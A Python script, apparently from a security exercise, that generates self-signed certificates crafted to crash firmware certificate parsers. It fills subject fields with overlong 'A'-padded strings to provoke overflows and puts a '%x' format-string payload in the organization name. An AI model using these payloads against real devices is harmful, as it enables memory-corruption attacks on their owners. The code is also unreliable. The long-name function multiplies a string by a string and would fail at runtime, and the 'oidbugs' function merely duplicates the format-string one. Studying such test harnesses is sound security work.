#!/usr/bin/env python

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
from OpenSSL import crypto, SSL
import base64
import string
import random

"""
This function will provide you a random string that is 'length' characters long.
You can use it to help you explore the firmware for bugs.
"""
def random_string(length):
    return ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(length))


def encode_cert(cert):

    return base64.b64encode(cert).decode('utf-8')

"""
This function takes some of the usual properties you would expect 
of a certificate. 
It returns a tuple: DER-encoded certificate, DER-encoded private key.

Note: probably this should be done with cryptography and not 
pyopenssl.
"""
def selfsigned_certificate(emailAddress="emailAddress",
             commonName="commonName",
             countryName="NT",
             localityName="localityName",
             stateOrProvinceName="stateOrProvinceName",
             organizationName="organizationName",
             organizationUnitName="organizationUnitName",
             serialNumber=0,
             validityStartInSeconds=0,
             validityEndInSeconds=10*365*24*60*60):

    # For small keys and fast generation, lets do this 
    # using P-256:
    q = ec.generate_private_key(ec.SECP256R1)
    q_der = q.private_bytes(encoding=Encoding.DER, format=PrivateFormat.TraditionalOpenSSL, encryption_algorithm=NoEncryption())
    k = crypto.load_privatekey(crypto.FILETYPE_ASN1, q_der)

    cert = crypto.X509()
    cert.get_subject().C = countryName
    cert.get_subject().ST = stateOrProvinceName
    cert.get_subject().L = localityName
    cert.get_subject().O = organizationName
    cert.get_subject().OU = organizationUnitName
    cert.get_subject().CN = commonName
    if len(emailAddress) > 0:
        cert.get_subject().emailAddress = emailAddress
    cert.set_serial_number(serialNumber)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(validityEndInSeconds)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(k)
    cert.sign(k, 'sha512')

    return (crypto.dump_certificate(crypto.FILETYPE_ASN1, cert), q_der)

def exploit_string(uintptr=4):
    return "A"*uintptr

def trigger_longnames():

    cert, key = selfsigned_certificate(emailAddress="",
                                       commonName=random_string(10)*(exploit_string()*5),
                                       countryName="CH",
                                       localityName=random_string(10)*(exploit_string()*5),
                                       stateOrProvinceName=random_string(10)*(exploit_string()*5),
                                       organizationName=random_string(10)*(exploit_string()*5),
                                       organizationUnitName=random_string(10)*(exploit_string()*5))


    return encode_cert(cert)

def trigger_formatbugs():

    cert, key = selfsigned_certificate(emailAddress="",
                                       commonName=random_string(28),
                                       countryName="CH",
                                       localityName=random_string(28),
                                       stateOrProvinceName=random_string(28),
                                       organizationName="%x",
                                       organizationUnitName=random_string(28))

    return encode_cert(cert)

def trigger_oidbugs():

    cert, key = selfsigned_certificate(emailAddress="",
                                       commonName=random_string(28),
                                       countryName="CH",
                                       localityName=random_string(28),
                                       stateOrProvinceName=random_string(28),
                                       organizationName="%x",
                                       organizationUnitName=random_string(28))

    return encode_cert(cert)
